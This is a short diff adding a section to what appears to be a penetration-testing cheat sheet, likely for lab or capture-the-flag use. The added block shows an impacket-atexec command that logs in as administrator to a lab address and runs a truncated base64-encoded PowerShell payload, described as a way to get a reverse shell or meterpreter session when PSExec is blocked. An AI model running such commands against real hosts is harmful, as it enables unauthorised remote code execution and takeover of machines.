@@ -488,3 +488,14 @@ $password
 ```
 
 </details>
+
+<details>
+
+<summary>PSExec Being Blocked? (Use impacket-atexec)</summary>
+
+```bash
+# Upgrade shell to meterpreter/simple ps revshell
+impacket-atexec administrator:'<password>'@10.10.158.54 "powershell -e SQBFAF…"
+```
+
+</details>
